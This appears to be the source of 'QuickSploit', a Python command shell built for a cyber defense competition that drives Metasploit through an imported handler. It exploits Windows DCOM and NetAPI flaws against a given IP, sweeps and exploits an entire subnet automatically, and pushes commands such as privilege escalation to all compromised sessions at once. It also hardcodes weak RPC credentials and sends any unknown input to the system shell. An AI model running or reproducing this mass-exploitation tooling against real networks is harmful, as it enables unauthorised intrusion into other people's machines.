#!/usr/bin/python3

import os
import cmd
import sys
import subprocess

from MSFHandler import MSFHandler

def clear():
	if os.name == 'nt':
		subprocess.call('cls', shell=True) 
	else:
		subprocess.call('clear', shell=True) 

def showBanner():
	clear()
	print('''
	       _ _   
	     /___ \_   _(_) ___| | __/ _\_ __ | | ___ (_) |_ 
	    //  / / | | | |/ __| |/ /\ \| '_ \| |/ _ \| | __|
	   / \_/ /| |_| | | (__|   < _\ \ |_) | | (_) | | |_ 
	   \___,_\ \__,_|_|\___|_|\_\\__/ .__/|_|\___/|_|\__|
	                                |_|                  
	                                Stay Classy My Friends.
	''')

class QuickSploit(cmd.Cmd):

	prompt = 'QuickSploit> '
	ruler  = '_'
	banner = showBanner()

	def setExploitHandler(self, msfHandler):
		self.msfHandler = msfHandler

	def requestLhost(self):
		ip = input("[#] Please Enter your Ip - (LHOST)\n")
		self.do_lhost(ip)

	def do_lhost(self,args):
		'''
[?] Set the current localhost ip address
	Example:
		lhost 192.168.10.1
		'''

		self.msfHandler.setLHost(args)

	def do_exploit(self,args):
		'''
[?] Quick Exploitation of easy to own boxes 
    Currently the supported exploits are (Dcom,Netapi)
    Example: 
    	exploit dcom 192.168.1.1
    	exploit netapi 192.168.1.1
		'''
		self.msfHandler.runExploitCommand(args)

	def do_session(self,args):
		'''
[?] Send a command to the specified session
	Example:
		session 1 help
		'''
		self.msfHandler.runSessionCommand(args)

	def do_sendtosessions(self,args):
		'''
[?] Send commands to all sessions at the same time
	Example:
		sendtosessions getSystem
		'''
		self.msfHandler.runSendToSessionsCommand(args)

	def do_sessioninfo(self,args):
		'''
[?] Shows information about the specified sessions
	Example:
	sessioninfo 1
		'''
		self.msfHandler.runSessionInfoCommand(args)

	def do_sessions(self,args):
		'''
[?] Shows current avalible sessions 
		'''
		self.msfHandler.runSessionsCommand(args)
	
	def do_banner(self,args):
		'''
[?] Shows the epic banner 
		'''
		showBanner()

	def do_clear(self,args):
		'''
[?] Clears the current screen 
		'''
		clear()

	def do_exit(self,args):
		'''
[?] Dies epicly in a fire 
		'''
		self.msfHandler.exit()
		sys.exit()

	def do_author(self,args):
		'''
[?] Shows author info 
		'''
		print("")
		print("********************")
		print(" Create by: wildicv")
		print("     For WRCCDC    ")
		print("********************")
		print("")

	def do_quicksploit(self,args):
		'''
[?] Calls the quicksploit functionality that scans and attempts 
	exploit machines that are currently vulnerable to (dcom,netapi)
	Example:
		quicksploit 192.168.62.1
	Witht he supplied it will begin to iterate through the 62.* subnet
		'''
		self.msfHandler.runQuickSploit(args)

	def default(self, args):
		os.system(args)

if __name__ ==  '__main__':

	# Change these settings to fit your setup
	msfHandler = MSFHandler('localhost',55552,'msf','abc123','')
	quickSploit = QuickSploit()
	quickSploit.setExploitHandler(msfHandler)
	quickSploit.requestLhost()
	quickSploit.cmdloop()
